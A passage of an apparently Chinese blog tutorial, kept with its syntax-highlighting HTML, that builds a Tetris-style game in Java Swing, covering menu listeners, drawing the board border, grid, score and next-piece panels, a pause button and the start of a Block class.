class=\"token function\">setFont</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Font</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"仿宋\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Font</span><span class=\"token punctuation\">.</span>BOLD<span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		\n		jm1<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>jmi1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		jm1<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>jmi2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		\n		jm2<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>jmi3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		jm2<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>jmi4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		\n		jmb<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>jm1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		jmb<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>jm2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		mainFrame<span class=\"token punctuation\">.</span><span class=\"token function\">setJMenuBar</span><span class=\"token punctuation\">(</span>jmb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 菜单Bar放到JFrame上</span>\n		jmi1<span class=\"token punctuation\">.</span><span class=\"token function\">addActionListener</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		jmi1<span class=\"token punctuation\">.</span><span class=\"token function\">setActionCommand</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Restart\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		jmi2<span class=\"token punctuation\">.</span><span class=\"token function\">addActionListener</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		jmi2<span class=\"token punctuation\">.</span><span class=\"token function\">setActionCommand</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Exit\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		\n		jmi3<span class=\"token punctuation\">.</span><span class=\"token function\">addActionListener</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		jmi3<span class=\"token punctuation\">.</span><span class=\"token function\">setActionCommand</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"help\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		jmi4<span class=\"token punctuation\">.</span><span class=\"token function\">addActionListener</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		jmi4<span class=\"token punctuation\">.</span><span class=\"token function\">setActionCommand</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"lost\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span>\n</code></pre> \n <p><strong>实现ActionListener并重写方法actionPerformed</strong><br> <img src=\"https://img-blog.csdnimg.cn/20210607222444575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RrbTEyMzQ1Ng==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br> <strong><mark>actionPerformed方法的实现</mark></strong><br> <img src=\"https://img-blog.csdnimg.cn/20210607222744362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RrbTEyMzQ1Ng==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br> <img src=\"https://img-blog.csdnimg.cn/20210607222835196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RrbTEyMzQ1Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"_121\"></a>绘制游戏区域</h2> \n <p><strong>绘制游戏区域边框</strong></p> \n <pre><code class=\"prism language-java\"><span class=\"token comment\">//绘制边框</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">drawBorder</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Graphics</span> g<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token class-name\">BasicStroke</span> bs_2<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">BasicStroke</span><span class=\"token punctuation\">(</span><span class=\"token number\">12L</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">BasicStroke</span><span class=\"token punctuation\">.</span>CAP_ROUND<span class=\"token punctuation\">,</span><span class=\"token class-name\">BasicStroke</span><span class=\"token punctuation\">.</span>JOIN_MITER<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token class-name\">Graphics2D</span> g_2d<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Graphics2D</span><span class=\"token punctuation\">)</span>g<span class=\"token punctuation\">;</span>\n	g_2d<span class=\"token punctuation\">.</span><span class=\"token function\">setColor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">,</span><span class=\"token number\">128</span><span class=\"token punctuation\">,</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	g_2d<span class=\"token punctuation\">.</span><span class=\"token function\">setStroke</span><span class=\"token punctuation\">(</span>bs_2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n	<span class=\"token class-name\">RoundRectangle2D<span class=\"token punctuation\">.</span>Double</span> rect <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RoundRectangle2D<span class=\"token punctuation\">.</span>Double</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">313</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">413</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	g_2d<span class=\"token punctuation\">.</span><span class=\"token function\">draw</span><span class=\"token punctuation\">(</span>rect<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p><strong>绘制右边辅助区域（积分、下一个、按钮等）</strong></p> \n <pre><code class=\"prism language-java\"><span class=\"token comment\">//绘制右边区域边框</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">drawBorderRight</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Graphics</span> g<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token class-name\">BasicStroke</span> bs_2<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">BasicStroke</span><span class=\"token punctuation\">(</span><span class=\"token number\">12L</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">BasicStroke</span><span class=\"token punctuation\">.</span>CAP_ROUND<span class=\"token punctuation\">,</span><span class=\"token class-name\">BasicStroke</span><span class=\"token punctuation\">.</span>JOIN_MITER<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token class-name\">Graphics2D</span> g_2d<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Graphics2D</span><span class=\"token punctuation\">)</span>g<span class=\"token punctuation\">;</span>\n	g_2d<span class=\"token punctuation\">.</span><span class=\"token function\">setColor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">,</span><span class=\"token number\">128</span><span class=\"token punctuation\">,</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	g_2d<span class=\"token punctuation\">.</span><span class=\"token function\">setStroke</span><span class=\"token punctuation\">(</span>bs_2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	\n	<span class=\"token class-name\">RoundRectangle2D<span class=\"token punctuation\">.</span>Double</span> rect <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RoundRectangle2D<span class=\"token punctuation\">.</span>Double</span><span class=\"token punctuation\">(</span><span class=\"token number\">336</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">140</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">413</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	g_2d<span class=\"token punctuation\">.</span><span class=\"token function\">draw</span><span class=\"token punctuation\">(</span>rect<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token comment\">//g_2d.drawRect(336, 6, 140, 413);</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p>在BackPanel 中重写paint 方法，并调用刚才两个区域绘制方法。<br> <img src=\"https://img-blog.csdnimg.cn/20210607225131296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RrbTEyMzQ1Ng==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br> <img src=\"https://img-blog.csdnimg.cn/20210607224917135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RrbTEyMzQ1Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <strong>绘制得分区域和下一个区域</strong></p> \n <pre><code class=\"prism language-java\"><span class=\"token comment\">//绘制积分区域</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">drawCount</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Graphics</span> g<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token class-name\">BasicStroke</span> bs_2<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">BasicStroke</span><span class=\"token punctuation\">(</span><span class=\"token number\">2L</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">BasicStroke</span><span class=\"token punctuation\">.</span>CAP_ROUND<span class=\"token punctuation\">,</span><span class=\"token class-name\">BasicStroke</span><span class=\"token punctuation\">.</span>JOIN_MITER<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token class-name\">Graphics2D</span> g_2d<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Graphics2D</span><span class=\"token punctuation\">)</span>g<span class=\"token punctuation\">;</span>\n	g_2d<span class=\"token punctuation\">.</span><span class=\"token function\">setColor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	g_2d<span class=\"token punctuation\">.</span><span class=\"token function\">setStroke</span><span class=\"token punctuation\">(</span>bs_2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	g_2d<span class=\"token punctuation\">.</span><span class=\"token function\">drawRect</span><span class=\"token punctuation\">(</span><span class=\"token number\">350</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	\n	<span class=\"token comment\">//得分</span>\n	g<span class=\"token punctuation\">.</span><span class=\"token function\">setFont</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Font</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"宋体\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Font</span><span class=\"token punctuation\">.</span>BOLD<span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	g<span class=\"token punctuation\">.</span><span class=\"token function\">drawString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"得分：\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">380</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">//绘制下一个区域</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">drawNext</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Graphics</span> g<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token class-name\">BasicStroke</span> bs_2<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">BasicStroke</span><span class=\"token punctuation\">(</span><span class=\"token number\">2L</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">BasicStroke</span><span class=\"token punctuation\">.</span>CAP_ROUND<span class=\"token punctuation\">,</span><span class=\"token class-name\">BasicStroke</span><span class=\"token punctuation\">.</span>JOIN_MITER<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token class-name\">Graphics2D</span> g_2d<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Graphics2D</span><span class=\"token punctuation\">)</span>g<span class=\"token punctuation\">;</span>\n	g_2d<span class=\"token punctuation\">.</span><span class=\"token function\">setColor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	g_2d<span class=\"token punctuation\">.</span><span class=\"token function\">setStroke</span><span class=\"token punctuation\">(</span>bs_2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	g_2d<span class=\"token punctuation\">.</span><span class=\"token function\">drawRect</span><span class=\"token punctuation\">(</span><span class=\"token number\">350</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	\n	<span class=\"token comment\">//得分</span>\n	g<span class=\"token punctuation\">.</span><span class=\"token function\">setFont</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Font</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"宋体\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Font</span><span class=\"token punctuation\">.</span>BOLD<span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	g<span class=\"token punctuation\">.</span><span class=\"token function\">drawString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"下一个：\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">360</span><span class=\"token punctuation\">,</span> <span class=\"token number\">140</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p><strong><mark>绘制网格（15列 20行）</mark></strong></p> \n <pre><code class=\"prism language-java\"><span class=\"token comment\">//绘制网格</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">drawGrid</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Graphics</span> g<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token class-name\">Graphics2D</span> g_2d<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Graphics2D</span><span class=\"token punctuation\">)</span>g<span class=\"token punctuation\">;</span>\n	g_2d<span class=\"token punctuation\">.</span><span class=\"token function\">setColor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span><span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">int</span> x1<span class=\"token operator\">=</span><span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">int</span> y1<span class=\"token operator\">=</span><span class=\"token number\">20</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">int</span> x2<span class=\"token operator\">=</span><span class=\"token number\">312</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">int</span> y2<span class=\"token operator\">=</span><span class=\"token number\">20</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> ROWS<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		y1 <span class=\"token operator\">=</span> <span class=\"token number\">12</span> <span class=\"token operator\">+</span> <span class=\"token number\">20</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">;</span>\n		y2 <span class=\"token operator\">=</span> <span class=\"token number\">12</span> <span class=\"token operator\">+</span> <span class=\"token number\">20</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">;</span>\n		g_2d<span class=\"token punctuation\">.</span><span class=\"token function\">drawLine</span><span class=\"token punctuation\">(</span>x1<span class=\"token punctuation\">,</span> y1<span class=\"token punctuation\">,</span> x2<span class=\"token punctuation\">,</span> y2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>		\n	<span class=\"token punctuation\">}</span>\n	\n	y1<span class=\"token operator\">=</span><span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\n	y2<span class=\"token operator\">=</span><span class=\"token number\">412</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> COLS<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		x1 <span class=\"token operator\">=</span> <span class=\"token number\">12</span> <span class=\"token operator\">+</span> <span class=\"token number\">20</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">;</span>\n		x2 <span class=\"token operator\">=</span> <span class=\"token number\">12</span> <span class=\"token operator\">+</span> <span class=\"token number\">20</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">;</span>\n		g_2d<span class=\"token punctuation\">.</span><span class=\"token function\">drawLine</span><span class=\"token punctuation\">(</span>x1<span class=\"token punctuation\">,</span> y1<span class=\"token punctuation\">,</span> x2<span class=\"token punctuation\">,</span> y2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>		\n	<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p><mark>在paint方法中调用</mark><br> <img src=\"https://img-blog.csdnimg.cn/20210607225629598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RrbTEyMzQ1Ng==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br> <mark>创建游戏右边区域的一个暂停按钮</mark></p> \n <pre><code class=\"prism language-java\"><span class=\"token comment\">//初始化</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token comment\">// 开始/停止按钮</span>\n	btnStart <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">JButton</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	btnStart<span class=\"token punctuation\">.</span><span class=\"token function\">setFont</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Font</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"黑体\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Font</span><span class=\"token punctuation\">.</span>PLAIN<span class=\"token punctuation\">,</span> <span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	btnStart<span class=\"token punctuation\">.</span><span class=\"token function\">setFocusPainted</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	btnStart<span class=\"token punctuation\">.</span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"暂停\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	btnStart<span class=\"token punctuation\">.</span><span class=\"token function\">setBounds</span><span class=\"token punctuation\">(</span><span class=\"token number\">360</span><span class=\"token punctuation\">,</span> <span class=\"token number\">300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	btnStart<span class=\"token punctuation\">.</span><span class=\"token function\">setBorder</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">BorderFactory</span><span class=\"token punctuation\">.</span><span class=\"token function\">createRaisedBevelBorder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>btnStart<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	btnStart<span class=\"token punctuation\">.</span><span class=\"token function\">addActionListener</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	btnStart<span class=\"token punctuation\">.</span><span class=\"token function\">setActionCommand</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"start\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p><img src=\"https://img-blog.csdnimg.cn/20210607225914977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RrbTEyMzQ1Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <mark>此时基本布局已经完成了。</mark></p> \n <h2><a id=\"2_231\"></a><mark>画布2</mark></h2> \n <p><strong>GamePanel 继承至 JPanel 并重写 paint 方法</strong><br> <mark>修改Main类，将画布2也放到窗口中</mark></p> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token comment\">//主类</span>\n	<span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token class-name\">GameFrame</span> frame <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">GameFrame</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token class-name\">BackPanel</span> panel <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BackPanel</span><span class=\"token punctuation\">(</span>frame<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		frame<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>panel<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token class-name\">GamePanel</span> gamePanel <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">GamePanel</span><span class=\"token punctuation\">(</span>frame<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		panel<span class=\"token punctuation\">.</span><span class=\"token function\">setGamePanel</span><span class=\"token punctuation\">(</span>gamePanel<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		frame<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>gamePanel<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		frame<span class=\"token punctuation\">.</span><span class=\"token function\">setVisible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//设定显示</span>\n	<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <h2><a id=\"2_248\"></a>画布2绘制一个小方块</h2> \n <p><strong>因为游戏区域被分成了一个个的小格子，每个小格子就是一个单位，整个网格就是一个15,、20的二维数组。<br> 于是第一行第一个元素，用数组下标来表示就是 0,0 、第一行第二个元素就是0、1<br> 这样就好办了，我们创建一个Block类，设置坐标和宽高即可绘制方块（宽高为固定20，与网格对应）。</strong></p> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">main</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>awt<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Graphics</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Block</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> x<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//x坐标</span>\n	<span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> y<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//y坐标</span>\n	<span class=\"token keyword\">private</span> <span class=\"token class-name\">GamePanel</span> panel<span class=\"token operator\">=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n	\n	<span class=\"token keyword\">public</span> <span class=\"token class-name\">Block</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> y<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> mX<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> mY<span class=\"token punctuation\">,</span><span class=\"token class-name\">GamePanel</span> panel<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>x<span class=\"token operator\">=</span>x<span class=\"token punctuation\">;</span>\n		<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>y<span class=\"token operator\">=</span>y<span class=\"token punctuation\">;</span>\n		<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>panel<span class=\"token operator\">=</span>panel<span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span>\n	<span class=\"token comment\">//绘制</span>\n	<span class=\"token keyword\">void</span> <span class=\"token function\">draw</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Graphics</span> g<span class=\"token punctuation\">)</span><span class=\"token 